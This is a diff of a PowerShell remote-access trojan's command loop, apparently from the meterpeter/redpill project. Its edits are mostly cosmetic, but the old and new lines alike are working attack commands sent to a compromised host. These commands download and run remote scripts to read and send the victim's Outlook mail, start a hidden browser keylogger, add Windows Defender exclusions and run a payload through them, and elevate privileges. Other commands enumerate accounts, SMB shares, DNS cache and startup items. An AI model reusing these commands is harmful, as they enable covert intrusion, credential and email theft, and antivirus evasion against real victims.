@@ -1277,8 +1277,8 @@ While($Client.Connected)
       $choise = Read-Host;
       If($choise -ieq "ListDNS" -or $choise -ieq "dns")
       {
-        write-host " * Remote host DNS entrys." -ForegroundColor Green;Start-Sleep -Seconds 1
-        $Command = "Get-DnsClientCache|Select-Object Entry,Name,DataLength,Data|Format-Table -AutoSize > dns.txt;Get-Content dns.txt;remove-item dns.txt -Force";
+        write-host " * Remote host DNS entrys.`n" -ForegroundColor Green;Start-Sleep -Seconds 1
+        $Command = "Get-DnsClientCache|Select-Object Entry,Name,DataLength,Data|Format-Table -AutoSize > dns.txt;`$TestData = Get-Content dns.txt;If([string]::IsNullOrEmpty(`$TestData)){echo `"   `> None remote DNS cache entrys found!`" `> dns.txt};Get-Content dns.txt;remove-item dns.txt -Force";
       }
       If($choise -ieq "TCPinfo" -or $choise -ieq "TCP")
       {
@@ -1300,12 +1300,12 @@ While($Client.Connected)
          }
          If($ConManager_choise -ieq "Query")
          {
-            write-host " * Enumerating established TCP connections.`n" -ForegroundColor Green
+            write-host " * Established TCP connections.`n" -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Enum;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
          }
          If($ConManager_choise -ieq "Verbose")
          {
-            write-host " * Enumerating established TCP\UDP connections.`n" -ForegroundColor Green
+            write-host " * Established TCP\UDP connections.`n" -ForegroundColor Green
             $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetConnections.ps1`" -OutFile `"`$Env:TMP\GetConnections.ps1`"|Out-Null;powershell -W 1 -file `$Env:TMP\GetConnections.ps1 -Action Verbose;Start-Sleep -Seconds 1;Remove-Item -Path `$Env:TMP\GetConnections.ps1 -Force"
          }
          If($ConManager_choise -ieq "Return" -or $ConManager_choise -ieq "cls" -or $ConManager_choise -ieq "Modules" -or $ConManager_choise -ieq "clear")
@@ -1543,7 +1543,7 @@ While($Client.Connected)
          {
             #Execute command remotely
             Write-Host " * Scanning OutLook for folder names!" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'folders' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   `> Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disable`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}";
          }
          If($OutLook_choise -ieq "Contacts")
          {
@@ -1567,7 +1567,7 @@ While($Client.Connected)
 
             #Execute command remotely
             Write-Host " * Scanning OutLook for Contact Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'contacts' -maxitems '$MaxOfObjectsToDisplay' -logfile `"$CreateLogFileSetting`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   `> Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disable`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
          }
          If($OutLook_choise -ieq "Emails")
          {
@@ -1602,7 +1602,7 @@ While($Client.Connected)
 
             #Execute command remotely
             Write-Host " * Scanning OutLook for Email Objects" -ForegroundColor Green
-            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+            $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Out-Null;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'enum' -MaxItems `"$MaxOfObjectsToDisplay`" -logfile `"$CreateLogFileSetting`" -verb `"$UseVerbose`" -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   `> Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disable`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
          }
          If($OutLook_choise -ieq "SendMail")
          {
@@ -1637,7 +1637,7 @@ While($Client.Connected)
                Write-Host " * Send Email using '" -ForegroundColor Green -NoNewline
                Write-Host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
                Write-Host "' OutLook!" -ForegroundColor Green
-               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disabled ..`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
+               $Command = "If((Get-MpComputerStatus).RealTimeProtectionEnabled -ieq `"True`"){iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/ReadEmails.ps1`" -OutFile `"`$Env:TMP\ReadEmails.ps1`"|Unblock-File;powershell -File `$Env:TMP\ReadEmails.ps1 -action 'send' -SendTo '$SendTo' -SendSubject '$SendSubject' -SendBody '$SendBody' -Egg `"True`";Remove-Item -Path `$Env:TMP\ReadEmails.ps1 -Force}Else{echo '';echo `"   `> Error: Outlook does not let us manipulate it if 'RealTimeProtection' its disable`" `> `$Env:TMP\fsddsvd.log;Get-Content -Path `"`$Env:TMP\fsddsvd.log`";Remove-Item -Path `"`$Env:TMP\fsddsvd.log`" -Force}"
             }
          }
          If($OutLook_choise -ieq "Return" -or $OutLook_choise -ieq "cls" -or $OutLook_choise -ieq "Modules")
@@ -1649,7 +1649,7 @@ While($Client.Connected)
       If($choise -ieq "Accounts" -or $choise -ieq "acc")
       {
          write-host " * Listing remote accounts." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,SID,PasswordRequired,PasswordChangeable|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   [x] Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
+         $Command = "Get-WmiObject Win32_UserAccount -filter 'LocalAccount=True'| Select-Object Name,SID,PasswordRequired,PasswordChangeable|Format-Table -AutoSize|Out-File users.txt;Start-Sleep -Seconds 1;`$Out = Get-Content users.txt|Select -Skip 1|Select -SkipLast 2;If(-not(`$Out)){echo `"   `> Error: cmdlet cant retrive remote host accounts ..`"}Else{echo `$Out};Remove-Item -Path users.txt -Force"
       }
       If($choise -ieq "RevShell" -or $choise -ieq "Shell")
       {
@@ -1677,7 +1677,7 @@ While($Client.Connected)
          $wifi_choise = Read-Host;
          If($wifi_choise -ieq "Query")
          {
-            Write-Host " - Process Name: " -NoNewline -ForeGroundColor Red;
+            Write-Host " - Query process name: " -NoNewline -ForeGroundColor Red;
             $Proc_name = Read-Host;
             If(-not ($proc_name) -or $Proc_name -ieq " ")
             {
@@ -1714,31 +1714,15 @@ While($Client.Connected)
                $Proc_name = Read-Host
                If(-not ($proc_name) -or $Proc_name -ieq " ")
                {
-                  write-host "`n   Error: We need to provide a process name ..`n" -ForegroundColor Red
+                  write-host "`n   `> Error: We need to provide a process name ..`n" -ForegroundColor Red
                   $Command = $Null;
                   $Proc_name = $Null;
                }
                Else
                {
-
-                  Write-Host " - Exclude PID from kill? (y|n) : " -ForegroundColor Red -NoNewline
-                  $Exclusion = Read-Host
-                  If(-not($Exclusion) -or $Exclusion -iMatch '(n|no)')
-                  {
-                     $Dontkill = "`$PID"
-                  }
-                  Else
-                  {
-                     Write-Host " - Input process PID number     : " -ForegroundColor Red -NoNewline
-                     $Dontkill = Read-Host
-                     If(-not ($Dontkill) -or $Dontkill -ieq " ")
-                     {
-                        $Dontkill = "`$PID"
-                     }
-                  }
-
-                  write-host " * Killing $Proc_name remote process." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name $Proc_name -ppid false -dontkill `"$DontKill`";Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"
+                  write-host " * Killing $Proc_name remote process." -ForegroundColor Green;
+                  If($Proc_name -iMatch '(.exe)$'){$Proc_name = $Proc_name -replace '.exe',''};Start-Sleep -Seconds 1;write-host "";
+                  $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/killProcess.ps1`" -OutFile `"`$Env:TMP\killProcess.ps1`"|Unblock-File;powershell -file `"`$Env:TMP\killProcess.ps1`" -Proc_name $Proc_name -ppid false -dontkill `"`$PID`";Remove-Item -Path `"`$Env:TMP\killProcess.ps1`" -Force"
                }
             }
             Else
@@ -1908,7 +1892,7 @@ While($Client.Connected)
          {
            write-host " * List " -ForegroundColor Green -NoNewline
            write-host "$Remote_Host" -ForegroundColor DarkYellow -NoNewline
-           write-host " install browsers" -ForegroundColor Green
+           write-host " browsers!" -ForegroundColor Green
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/GetBrowsers.ps1`" -OutFile `"`$Env:TMP\GetBrowsers.ps1`"|Out-Null;powershell -WindowStyle hidden -File `$Env:TMP\GetBrowsers.ps1 -RECON;Remove-Item -Path `$Env:TMP\BrowserEnum.log -Force;Remove-Item -Path `$Env:TMP\GetBrowsers.ps1 -Force"
          }
          If($Enumerate_choise -ieq "addons")
@@ -1948,18 +1932,18 @@ While($Client.Connected)
       If($choise -ieq "Recent" -or $choise -ieq "rece")
       {
          #$path = "$env:userprofile\AppData\Roaming\Microsoft\Windows\Recent"
-         write-host " * Listing recent folder contents." -ForegroundColor Green;Start-Sleep -Seconds 1
+         write-host " * Listing recent directory!" -ForegroundColor Green;Start-Sleep -Seconds 1
          $Command = "Get-ChildItem `$Env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent|Select-Object Length,Name,CreationTime,LastWriteTime,Attributes|Format-Table -AutoSize|Select -SkipLast 1|Out-File startup.txt;Get-content startup.txt;Remove-Item startup.txt -Force"
       }
       If($choise -ieq "ListSMB" -or $choise -ieq "smb")
       {
-         write-host " * Listing remote SMB shares." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-SmbShare|Select-Object Name,Path,Description|ft|Out-File smb.txt;Start-Sleep -Seconds 1;`$i = Get-Content smb.txt;If(-not(`$i)){echo `"   Error: none SMB accounts found under current system..`" `> smb.txt};Get-Content smb.txt;remove-item smb.txt -Force";
+         write-host " * Remote SMB shares." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
+         $Command = "Get-SmbShare|Select-Object Name,Path,Description|ft|Out-File smb.txt;Start-Sleep -Seconds 1;`$i = Get-Content smb.txt;If(-not(`$i)){echo `"   `> Error: none SMB accounts found under `$Env:COMPUTERNAME`" `> smb.txt};Get-Content smb.txt;remove-item smb.txt -Force";
       }
       If($choise -ieq "StartUp" -or $choise -ieq "start")
       {
-         write-host " * Listing remote host StartUp contents." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
-         $Command = "Get-ChildItem `"`$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`"|Select-Object Length,Name,LastWriteTime|Format-Table -AutoSize|Out-File startup.txt;`$checkme = Get-Content -Path startup.txt;If(-not(`$checkme ) -or `$checkme -ieq `$null){echo `"   Error: none contents found on startup directory!`" `> startup.txt};Get-Content -Path startup.txt;Remove-Item startup.txt -Force";
+         write-host " * Remote host StartUp contents." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "";
+         $Command = "Get-ChildItem `"`$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup`"|Select-Object Length,Name,LastWriteTime|Format-Table -AutoSize|Out-File startup.txt;`$checkme = Get-Content -Path startup.txt;If(-not(`$checkme ) -or `$checkme -ieq `$null){echo `"   `> Error: none contents found on startup directory!`" `> startup.txt};Get-Content -Path startup.txt;Remove-Item startup.txt -Force";
       }
       If($choise -ieq "ListRun" -or $choise -ieq "run")
       {
@@ -2170,7 +2154,7 @@ While($Client.Connected)
            If($Exechoise -iMatch '^(stop)$')
            {
               write-host ""
-              $Command = "If(Test-Path -Path `"`$Env:TMP\Browser.report`"){`$PPID = (Get-Content -Path `"`$Env:TMP\Browser.report`"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s','';If(`$PPID){echo `"Stoping Process ID: `$PPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$PPID`" -Force;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}Else{echo `"   Error: fail to find keyloger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}}Else{echo `"   NotFound: `$Env:TMP\Browser.report`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}"
+              $Command = "If(Test-Path -Path `"`$Env:TMP\Browser.report`"){`$PPID = (Get-Content -Path `"`$Env:TMP\Browser.report`"|Select-String -Pattern '\s*Process Id+\s*:+\s') -replace '\s*Process Id+\s*:+\s','';If(`$PPID){echo `"Stoping Process ID: `$PPID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Stop-Process -Id `"`$PPID`" -Force;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}Else{echo `"   `> Error: fail to find keyloger process PID`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\Browser.report;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\Browser.report`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}}Else{echo `"   NotFound: `$Env:TMP\Browser.report`" `> `$Env:TMP\fdx.log;Get-Content -Path `$Env:TMP\fdx.log;Remove-Item -Path `"`$Env:TMP\fdx.log`" -Force;Remove-Item -Path `"`$Env:TMP\BrowserLogger.ps1`" -Force}"
            }
            Else
            {
@@ -2193,11 +2177,11 @@ While($Client.Connected)
               $DumpHistory = Read-Host
               If($DumpHistory -Match '^(y|yes)$')
               {
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -history -force true`";echo `"`n   Browser keylogger schedule to: [$StartMe] hours`";echo `"   Logfile: `$Env:TMP\Browser.report`""
+                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -history -force true`";echo `"`n   `> Browser keylogger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""
               }
               Else
               {
-                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -delay $Delay -starttime $StartMe -log -force true`";echo `"`n   Browser keylogger schedule to: [$StartMe] hours`";echo `"   Logfile: `$Env:TMP\Browser.report`""           
+                 $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/browserLogger.ps1`" -OutFile `"`$Env:TMP\browserLogger.ps1`"|Unblock-File;Start-Process -WindowStyle hidden powershell -ArgumentList `"-file `$Env:TMP\browserLogger.ps1 -starttime $StartMe -delay $Delay -log -force true`";echo `"`n   `> Browser keylogger schedule to: [$StartMe] hours`";echo `"   `> Logfile: `$Env:TMP\Browser.report`""           
               }
            }
         }
@@ -2547,7 +2531,7 @@ While($Client.Connected)
         {
            #Execute command remote
            write-host " * Query for Defender exclusions.`n`n" -ForegroundColor Green
-           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'query';Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'query';Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
         }
         If($WD_choise -ieq "Create")
         {
@@ -2566,7 +2550,7 @@ While($Client.Connected)
 
            #Execute command remote
            write-host " * Create a new Defender exclusion.`n`n" -ForegroundColor Green
-           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'add' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'add' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
         }
         If($WD_choise -ieq "UrlExec")
         {
@@ -2591,12 +2575,12 @@ While($Client.Connected)
               If(-not($Arguments) -or $Arguments -eq $null)
               {
                  #Execute command remote
-                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"   
+                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"   
               }
               Else
               {
                  #Execute command remote
-                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`" -Arguments `"$Arguments`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+                 $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'exec' -Type `"$ExcludeType`" -Exclude `"`$Env:TMP`" -Uri `"$UriLink`" -Arguments `"$Arguments`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
               }
            }
         }
@@ -2617,7 +2601,7 @@ While($Client.Connected)
 
            #Execute command remote
            write-host " * Delete one Defender exclusion.`n`n" -ForegroundColor Green
-           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'del' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
+           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WD-Bypass/Invoke-Exclusions.ps1`" -OutFile `"`$Env:TMP\Invoke-Exclusions.ps1`";powershell -file `"`$Env:TMP\Invoke-Exclusions.ps1`" -Action 'del' -Type `"$ExcludeType`" -Exclude `"$ExcludePath`";Remove-Item -Path `"`$Env:TMP\Invoke-Exclusions.ps1`" -Force}Else{echo `"   `> Error: administrator privileges required.`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
         }
         If($WD_choise -ieq "Return" -or $WD_choise -ieq "cls" -or $WD_choise -ieq "Modules" -or $WD_choise -ieq "clear")
         {
@@ -2647,7 +2631,7 @@ While($Client.Connected)
            #Execute command remote
            $CmdlineToExecute = "whoami /priv|Out-File myprivileges.log -Force"
            write-host " * Elevating all process privileges (demo)." -ForegroundColor Green
-           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/EnableAllParentPrivileges.exe`" -OutFile `"`$Env:TMP\EnableAllParentPrivileges.exe`"|Unblock-File;cd `$Env:TMP;.\EnableAllParentPrivileges.exe;$CmdlineToExecute;Remove-Item -Path `"`$Env:TMP\EnableAllParentPrivileges.exe`" -Force;Get-Content myprivileges.log;Remove-Item myprivileges.log -Force}Else{echo `"   Error: administrator privileges required on remote`" `> `$Env:TMP\fddds.log;Get-Content -Path `"`$Env:TMP\fddds.log`";Remove-Item -Path `"`$Env:TMP\fddds.log`" -Force}"
